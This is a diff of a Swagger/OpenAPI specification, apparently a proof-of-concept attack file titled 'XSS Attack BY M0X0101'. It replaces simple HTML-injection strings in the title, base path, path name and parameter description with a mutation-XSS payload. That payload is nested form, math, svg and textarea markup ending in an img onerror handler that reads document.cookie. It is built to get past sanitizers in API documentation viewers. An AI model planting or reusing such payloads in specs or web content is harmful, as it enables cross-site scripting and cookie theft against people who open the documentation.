@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
-  title: XSS>< Attack BY M0X0101<h1>hacked</h1>
+  title: XSS Attack BY M0X0101
   description: |
-   "><h1>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
-basePath: /JSSResource"><h1>/
+basePath: /JSSResource/
 produces:
   - application/xml
   - application/json
@@ -14,7 +14,7 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101"><h1><h>:
+  /M0X0101:
     get:
       responses:
         '200':
@@ -27,7 +27,8 @@ paths:
     delete:
       parameters:
         - description: |
-        "><h1>hacked<a>jj</a>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+          format: int64
           in: path
           name: id
           required: true
